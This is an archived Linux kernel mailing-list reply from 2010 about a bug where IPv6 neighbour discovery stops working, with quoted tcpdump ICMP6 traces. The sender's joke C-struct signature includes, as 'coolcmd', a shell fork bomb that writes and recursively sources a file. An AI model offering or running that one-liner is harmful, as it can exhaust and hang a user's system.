Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1757860Ab0HQQOI (ORCPT <rfc822;w@1wt.eu>);
	Tue, 17 Aug 2010 12:14:08 -0400
Received: from reptilian.habets.pp.se ([193.151.93.131]:1377 "EHLO
	reptilian.habets.pp.se" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1757274Ab0HQQOH (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Tue, 17 Aug 2010 12:14:07 -0400
Date: Tue, 17 Aug 2010 18:14:01 +0200 (CEST)
From: Thomas Habets <thomas@habets.pp.se>
X-X-Sender: thompa@red.crap.retrofitta.se
To: Thomas Habets <thomas@habets.pp.se>
cc: Eric Dumazet <eric.dumazet@gmail.com>, linux-kernel@vger.kernel.org,
        netdev <netdev@vger.kernel.org>
Subject: Re: BUG: IPv6 stops working after a while, needs ip ne del command
 to reset
In-Reply-To: <alpine.DEB.1.10.1008171547090.21857@red.crap.retrofitta.se>
Message-ID: <alpine.DEB.1.10.1008171811590.21857@red.crap.retrofitta.se>
References: <alpine.DEB.1.10.1008131952470.19570@red.crap.retrofitta.se>  <1281953960.2524.23.camel@edumazet-laptop>  <alpine.DEB.1.10.1008161224510.13728@red.crap.retrofitta.se>  <alpine.DEB.1.10.1008170719180.21857@red.crap.retrofitta.se> 
 <1282024802.2487.687.camel@edumazet-laptop>  <alpine.DEB.1.10.1008171053230.21857@red.crap.retrofitta.se> <1282050920.2448.47.camel@edumazet-laptop> <alpine.DEB.1.10.1008171547090.21857@red.crap.retrofitta.se>
User-Agent: Alpine 1.10 (DEB 962 2008-03-14)
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

On Tue, 17 Aug 2010, Thomas Habets wrote:
> [ here i run "ip l set promisc on eth0" ]
[...]
> 2a00:800:752:1::5c:2 > 2a00:800:752:1::5c:1: ICMP6, echo request
> 2a00:800:752:1::5c:1 > 2a00:800:752:1::5c:2: ICMP6, echo reply

I should add that I turned promisc mode back off at about here. Otherwise 
the ND would work properly right after the "clear ipv6 neigbors" command.

> [ here I run "clear ipv6 neigbors" again ]
> 2a00:800:752:1::5c:2 > 2a00:800:752:1::5c:1: ICMP6, echo request
> 2a00:800:752:1::5c:2 > 2a00:800:752:1::5c:1: ICMP6, echo request

---------
typedef struct me_s {
   char name[]      = { "Thomas Habets" };
   char email[]     = { "thomas@habets.pp.se" };
   char kernel[]    = { "Linux" };
   char *pgpKey[]   = { "http://www.habets.pp.se/pubkey.txt" };
   char pgp[] = { "A8A3 D1DD 4AE0 8467 7FDE  0945 286A E90A AD48 E854" };
   char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
} me_t;
